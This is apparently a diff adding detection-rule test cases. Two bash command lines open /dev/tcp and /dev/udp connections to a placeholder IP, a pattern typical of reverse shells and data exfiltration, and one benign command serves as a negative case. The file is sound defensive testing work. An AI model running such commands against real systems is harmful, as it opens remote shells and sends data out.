@@ -1,0 +1,18 @@
+tests:
+  - name: detects a bash /dev/tcp redirect
+    event:
+      Image: /bin/bash
+      CommandLine: "bash -c \"exec 5<>/dev/tcp/203.0.113.7/4444\""
+    expected: true
+
+  - name: detects a /dev/udp redirect
+    event:
+      Image: /bin/bash
+      CommandLine: "bash -c \"echo hi > /dev/udp/203.0.113.7/53\""
+    expected: true
+
+  - name: ignores an ordinary shell command
+    event:
+      Image: /bin/bash
+      CommandLine: "bash -c \"ls -la /var/log\""
+    expected: false
